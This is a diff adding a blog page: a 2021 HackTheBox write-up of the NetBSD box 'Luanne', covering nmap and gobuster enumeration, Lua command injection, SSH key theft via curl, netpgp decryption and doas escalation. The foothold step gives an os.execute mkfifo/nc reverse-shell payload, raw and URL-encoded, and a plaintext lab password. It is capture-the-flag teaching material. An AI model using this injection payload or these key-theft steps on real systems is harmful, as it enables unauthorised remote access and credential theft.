@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="Luanne HTB Writeup">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Luanne HackTheBox Writeup"/>
+<meta name="twitter:description" content="Luanne HTB Writeup"/>
+
+    <meta property="og:title" content="Luanne HackTheBox Writeup" />
+<meta property="og:description" content="Luanne HTB Writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/luanne/" />
+<meta property="article:published_time" content="2021-02-11T16:52:33+05:30" />
+<meta property="article:modified_time" content="2021-02-11T16:52:33+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/delivery/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/doctor/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/academy/" />
+
+
+
+    <title>
+  Luanne HackTheBox Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/luanne/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Luanne HackTheBox Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-02-11T16:52:33&#43;05:30'>
+                February 11, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/hackthebox/">HackTheBox</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/htb/">htb</a>
+      <span class="separator">•</span>
+    <a href="/tags/easy_box/">easy_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="luannehttpswwwhacktheboxeuhomemachinesprofile302-hackthebox-writeup"><a href="https://www.hackthebox.eu/home/machines/profile/302">Luanne</a> HackTheBox Writeup</h1>
+<p><img src="/HackTheBox/Luanne/BoxImage.webp" alt=""></p>
+<h2 id="pathway">Pathway</h2>
+<p>This is the first BSD box I have done , hence through this process I learned more about BSD .  I recommend learning BSD which is similar to linux but it has it&rsquo;s own commands also .  Hence in this box we gain foothold using command injection(<strong>lua</strong>) vulnerability and then we get user&rsquo;s ssh private key and decrypt a file and get root password .</p>
+<h2 id="__first-stage--enumeration__"><strong>First Stage : Enumeration</strong></h2>
+<p>Nmap scan results.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Sun Feb  7 20:13:47 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.10.218
+Nmap scan report for 10.10.10.218
+Host is up, received conn-refused (0.24s latency).
+Scanned at 2021-02-07 20:13:48 IST for 1037s
+Not shown: 65532 closed ports
+Reason: 65532 conn-refused
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+| ssh-hostkey: 
+|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1nFqkIP48mPiQbwIS5LLjiwBR+cn31ljUqGmtdlLPEisAgHbcVrGhXbSkUoHHOtUi/qn+yP9SyUHzMDv7WaeKUkmKgFLsin2xiX0VT82nU5RYQ2YTh/WBXeSKEx7g7oMO6L1G3XBJ24Igf3F3z0r3hwjkjAJqtoH27ERq9IUZuvsSlNndjM/Q2G6ZHNwSjqjrS+rddamP91vn0emJZvcDP4tEi3p56isuCB/6I3Gx31ucapzNknY91fZmko6133eIRRpUqnc/Mk3Spv2bMBxhtYHr1FYiwRf1fk9TfdqPWOToA/YzUvXsEGf5EEzVw3FLMdOkJcI8CR3Y510CJ/W+gefPCOs5l1tcqNLJBw1qNBHyzyO0a2Jlm0vU69BiSwpxNyZmLq9QIfPFGHXrw6b0Ul94eFqPzkcxenP+s9N5ZN35TwWJz7MHTrbRY5Rs9iwGZ4zy5F3gSqKWPekNzPESWO+DoJIcgqNzQVplqaOL5yQLQqMJJTudDEUuIqN/1Zk=
+|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
+| ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBAFlwEzim2pzpW7PYcDQB8EQCWPSUxYMK/Tv0fgtPIMkiLepeDQ2WTEdtBnAGRg0CBp6MRM8RR6M+dUeMy9Zm02hpgFjEjNrcXstpm2mS+8axgwxoT2A5F/hkMms6ckkjfMhdLHom+8ZlHPFcX5MWl1cIIuH+A+RGZuJNb6QpEIvguSV/A==
+|   256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMDw96/CWlrLxN0y9RAm9LU3MPNEJOYbJlzMxzUutOIQ
+80/tcp   open  http    syn-ack nginx 1.19.0
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=.
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+| http-robots.txt: 1 disallowed entry 
+|_/weather
+|_http-server-header: nginx/1.19.0
+|_http-title: 401 Unauthorized
+9001/tcp open  http    syn-ack Medusa httpd 1.12 (Supervisor process manager)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=default
+|_http-server-header: Medusa/1.12
+|_http-title: Error response
+Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+</code></pre></div><p>Hence the open ports are :</p>
+<ul>
+<li>22</li>
+<li>80</li>
+<li>9001</li>
+</ul>
+<p>First I visited port 80 .</p>
+<p>Webserver  requested for username and password , I tried some common username and passwords , it didn&rsquo;t work .</p>
+<p><img src="/HackTheBox/Luanne/port80.png" alt=""></p>
+<p>Hence this shows that there is service running on port 3000 locally on the machine .</p>
+<p>Next I used gobuster .</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://luanne.htb
+[+] Threads:        50
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,php,json,js,txt
+[+] Timeout:        10s
+===============================================================
+2021/02/07 20:27:05 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/robots.txt (Status: 200)
+</code></pre></div><p>Hence when I visited robots.txt , I got this.</p>
+<p><img src="/HackTheBox/Luanne/robot.png" alt=""></p>
+<p>When I visited <strong>/weather</strong> I got 404 . So I used gobuster again but the url was <strong><a href="http://luanne.htb/weather/">http://luanne.htb/weather/</a></strong> .</p>
+<p>The results are .</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://luanne.htb/weather/
+[+] Threads:        50
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     js,txt,html,php,json
+[+] Timeout:        10s
+===============================================================
+2021/02/07 21:23:51 Starting gobuster
+===============================================================
+/forecast (Status: 200)
+</code></pre></div><p>So I visited forecast.</p>
+<p><img src="/HackTheBox/Luanne/forecast.png" alt=""></p>
+<p>Hence I tried</p>
+<blockquote>
+<p><a href="http://luanne.htb/weather/forecast?city=list">http://luanne.htb/weather/forecast?city=list</a></p>
+</blockquote>
+<p><img src="/HackTheBox/Luanne/citylist.png" alt=""></p>
+<h2 id="__second-stage--initial-foothold__"><strong>Second Stage : Initial foothold</strong></h2>
+<p>So I we can use this api to our foothold . Hence I tried command injection , nothing worked . Then I remembered the box name and though this was related to <strong>Lua</strong> .</p>
+<p>So we have to use os.execute() in order for command injection . I used the following payload and url encoded it  .</p>
+<blockquote>
+<p>&lsquo;);os.execute(&ldquo;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;vpn-ip&gt; 4242 &gt;/tmp/f&rdquo;)&ndash;</p>
+</blockquote>
+<p>And passed it in url as</p>
+<blockquote>
+<p>http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.14.19+4242+%3E%2Ftmp%2Ff%22%29&ndash;</p>
+</blockquote>
+<p>I got shell. In that directory I found a hash .</p>
+<p><img src="/HackTheBox/Luanne/wwwdata.png" alt=""></p>
+<p>I cracked the hash and got the password for <strong>webapi_user</strong>.</p>
+<p>I found a user in home directory called <strong>r.michaels</strong></p>
+<h2 id="__third-stage--httpd-to-rmichaels">__Third Stage : httpd to r.michaels</h2>
+<p>After running</p>
+<blockquote>
+<p>netstat -nat | grep LISTEN</p>
+</blockquote>
+<p>I found two ports.</p>
+<ul>
+<li>3000</li>
+<li>3001</li>
+</ul>
+<p><img src="/HackTheBox/Luanne/openports.png" alt=""></p>
+<p>Hence I tried curl to get what is happening on those ports.</p>
+<p>Both of them responded with code 401 (unathorized) , just like the port 80.</p>
+<p>Since we got the password of <strong>webapi_user</strong> I tried</p>
+<blockquote>
+<p>curl -u webapi_user:&lt;pass&gt; http://127.0.0.1:3000/</p>
+</blockquote>
+<p><img src="/HackTheBox/Luanne/webapiuser.png" alt=""></p>
+<p>Hence the password was working . I tried many things to get to the user&rsquo;s ssh private key . But nothing worked . With help of a hint from a friend I did this.</p>
+<blockquote>
+<p>curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/id_rsa</p>
+</blockquote>
+<p>I got the private key.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#ff0;font-weight:bold">600</span> id_rsa
+ssh -i id_rsa r.michaels@luanne.htb
+</code></pre></div><p><img src="/HackTheBox/Luanne/michaels.png" alt=""></p>
+<h2 id="__fourth-stage--rmichaels-to-root__"><strong>Fourth Stage : r.michaels to root</strong></h2>
+<p>I found a folder called <strong>backups</strong> , in that I found an encrypted file .</p>
+<p><img src="/HackTheBox/Luanne/backup.png" alt=""></p>
+<p>Since it is encrypted I first tried using openssl to decrypt but didn&rsquo;t work . Then I found <a href="https://en.wikipedia.org/wiki/Netpgp">Netpgp</a> which is used in BSD .</p>
+<p><img src="/HackTheBox/Luanne/netpgp.png" alt=""></p>
+<p>Hence I used</p>
+<blockquote>
+<p>netpgp &ndash;decrypt devel_backup-2020-09-16.tar.gz.enc &ndash;output /tmp/decrypted.tar.gz</p>
+</blockquote>
+<p><img src="/HackTheBox/Luanne/decrypt.png" alt=""></p>
+<p>Next I unzipped it using tar</p>
+<blockquote>
+<p>tar -xvf decrypted.tar.gz</p>
+</blockquote>
+<p><img src="/HackTheBox/Luanne/hash2.png" alt=""></p>
+<p>Hence we got another hash I decrypted and used it to sudo su as root , but didn&rsquo;t work.</p>
+<p>Hence I searched and got to know about <strong>doas</strong>.</p>
+<p><img src="/HackTheBox/Luanne/root.png" alt=""></p>
+<p>Hence I hope U learned something new through this writeup just like me :)</p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in HackTheBox</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/hackthebox/delivery/">Delivery HackTheBox Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/hackthebox/doctor/">Doctor HacktheBox Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/hackthebox/academy/">Academy HacktheBox Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
